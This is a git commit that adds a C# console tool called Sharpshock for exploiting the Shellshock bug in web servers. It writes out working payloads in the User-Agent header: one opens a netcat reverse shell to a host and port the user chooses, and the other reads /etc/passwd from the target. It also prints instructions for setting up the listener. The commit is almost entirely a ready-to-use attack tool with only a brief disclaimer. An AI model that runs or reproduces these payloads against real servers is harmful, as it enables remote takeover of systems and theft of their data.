ac5e88173cc8ce2fd16873ecb21a03325ebd0605
pr0tonn <ditistestdag@gmail.com>
2017-04-09 03:49:03 +0200

    Add files via upload

---
+++ Sharpshock/Program.cs
@@ -0,0 +1,46 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.Net.Http;
+using System.IO.Compression;
+using System.IO;
+using Sharpshock;
+
+namespace Sharpshock
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.Clear();
+            Console.WriteLine(@"
+   ▄▄▄▄▄    ▄  █ ██   █▄▄▄▄ █ ▄▄         ▄▄▄▄▄    ▄  █ ████▄ ▄█▄    █  █▀ 
+  █     ▀▄ █   █ █ █  █  ▄▀ █   █       █     ▀▄ █   █ █   █ █▀ ▀▄  █▄█   
+▄  ▀▀▀▀▄   ██▀▀█ █▄▄█ █▀▀▌  █▀▀▀      ▄  ▀▀▀▀▄   ██▀▀█ █   █ █   ▀  █▀▄   
+ ▀▄▄▄▄▀    █   █ █  █ █  █  █          ▀▄▄▄▄▀    █   █ ▀████ █▄  ▄▀ █  █  
+              █     █   █    █                      █        ▀███▀    █   
+             ▀     █   ▀      ▀                    ▀                 ▀    
+                  ▀                                                       ");
+            Console.WriteLine("Author: Pr0ton.{0}{1}This tool whether a server is vulnerable to a shellshock attack by changing the user-agent to a malicious command.{2}{3}By using this tool you agree to take fully responsibility on your own actions.", Environment.NewLine, Environment.NewLine, Environment.NewLine, Environment.NewLine);
+            Console.WriteLine("------------------------------------------------------------------------------");
+
+            // Begin program
+            var evil = new sendCommand();
+            var server = "";
+            var filePath = "";
+
+            Console.WriteLine("[+] Vulnerable server:");
+            server = Console.ReadLine();
+
+            Console.WriteLine("{0}[+] Vulnerable path:",Environment.NewLine);
+            filePath = Console.ReadLine();
+
+            evil.shellshock(server,filePath);
+
+            Console.ReadKey();
+        }
+    }
+}
---
+++ Sharpshock/sendCommand.cs
@@ -0,0 +1,82 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Net;
+using System.IO;
+using System.Diagnostics;
+using System.Web;
+
+namespace Sharpshock
+{
+    class sendCommand
+    {
+        public void shellshock(string website, string filePath)
+        {
+
+            var shellOrEtc = 0;
+            var userAgent = "";
+
+            var lhost = "";
+            var port = 0;
+
+            website = website + filePath;
+
+
+            if (website.Substring(0, 7) != "http://")
+                website = "http://" + website;
+            
+
+            var request = (HttpWebRequest)WebRequest.Create(website);
+
+            Console.WriteLine();
+
+            Console.WriteLine("{0}[+] Testing {1} ",Environment.NewLine, website);
+
+            Console.WriteLine("{0}[+] Reverse shell [1] or read /etc/passwd [2]", Environment.NewLine);
+            shellOrEtc = Int32.Parse(Console.ReadLine());
+
+
+            if (shellOrEtc == 1)
+            {
+                Console.WriteLine(Environment.NewLine+"[+] Pick a host:");
+                lhost = Console.ReadLine();
+
+                Console.WriteLine(Environment.NewLine + "[+] Pick a port");
+                port = Int32.Parse(Console.ReadLine());
+
+                Console.WriteLine("{0}[+] Listener: {1}", Environment.NewLine, lhost);
+                Console.WriteLine("[+] Port: {0}",port );
+
+                userAgent = "() { :;}; /bin/bash -c 'nc " + lhost + " " + port + " -e /bin/bash -i'";
+
+                Console.WriteLine("{0}[+] You need Netcat for this feature.{1}[+] After downloading Netcat run this command before hitting enter:", Environment.NewLine,Environment.NewLine);
+                Console.WriteLine(@"[+] .\nc - vlp {0}",port);
+                Console.WriteLine("{0}[+] Press enter to start the attack", Environment.NewLine);
+
+                Process.Start("cmd.exe");
+                Console.ReadKey();
+
+                Console.WriteLine("[+] Spawning a shell.");
+            }
+            else
+            {
+                userAgent = "() { :;}; echo; /bin/cat /etc/passwd";
+                Console.WriteLine("{0}Reading /etc/passwd...:{1}{2}",Environment.NewLine, Environment.NewLine,Environment.NewLine);
+            }
+            request.UserAgent = userAgent;
+            try
+            {
+                var responseReader = new StreamReader(request.GetResponse().GetResponseStream());
+                var responseData = responseReader.ReadToEnd();
+                Console.WriteLine(responseData);
+            }
+            catch
+            {
+                Console.WriteLine("{0}[+] Connection lost",Environment.NewLine);
+                Console.WriteLine("{0}Press enter to exit",Environment.NewLine);
+            }
+        }
+    }
+}
